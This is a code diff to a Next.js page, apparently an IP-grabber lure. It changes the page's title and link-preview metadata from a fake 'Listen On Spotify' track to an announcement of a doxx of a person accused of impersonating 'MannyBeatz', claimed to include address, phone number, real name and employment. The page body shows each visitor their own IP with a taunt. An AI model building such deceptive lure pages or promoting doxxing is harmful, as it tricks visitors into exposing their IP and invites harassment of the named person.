@@ -35,9 +35,9 @@ const Home: NextPage = () => {
   return (
     <div className={styles.container}>
       <Head>
-        <title>Listen On Spotify</title>
-        <meta name="description" content="Listen to LWIMCD - FLAUGIN on Spotify " />
-        <meta property="og:image" content="https://cdn.discordapp.com/attachments/961588124541141124/965920087771082772/IMG_5481.jpeg" />
+        <title>"MannyBeatz" Impersonator Doxx</title>
+        <meta name="description" content="Immy Doxxed for impersonating MannyBeatz includes address, phone number, real name, and partial employment inforamtion" />
+        <meta property="og:image" content="https://cdn.discordapp.com/attachments/971514890432954398/972285109673803856/BB872448-5EF0-424A-BDCD-895D2163EDD2.jpg" />
       </Head>
       {isLoading ? <div className={styles.loader}>Loading...</div> : <h1>Your IP is: {IP} ;)</h1>}
     </div>
